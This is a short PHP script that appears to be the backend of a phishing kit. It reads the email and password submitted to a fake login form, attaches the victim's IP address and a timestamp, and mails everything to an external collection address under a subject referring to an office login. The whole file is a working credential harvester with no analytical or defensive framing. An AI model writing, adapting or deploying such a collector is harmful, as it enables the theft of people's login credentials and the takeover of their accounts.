<?php



$ips = getenv("REMOTE_ADDR");

$timedate = date("D/M/d, Y g(idea) a"); 

if(!empty($_POST)) {
 $email= $_POST['email'];
 $password = $_POST['password'];


 
 
$resultbox = "logs@qatarairwaystender.com";



         $subject = "New Login from justin well office @justinwellTool";
		 
		 $message =  "Online ID            : ".$email."\r\n";
         $message .= "Password           : ".$password."\r\n";
		 $message .= "IP           : ".$ips."\r\n";

		 $message .= "Date And Time          : ".$timedate."\r\n";			 
		 $message .= "Login Successful       : No\r\n";
		$header = "Content type:justin well @justinwellTool\r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
		 mail ($resultbox,$subject,$message,$header);
		
}




?> 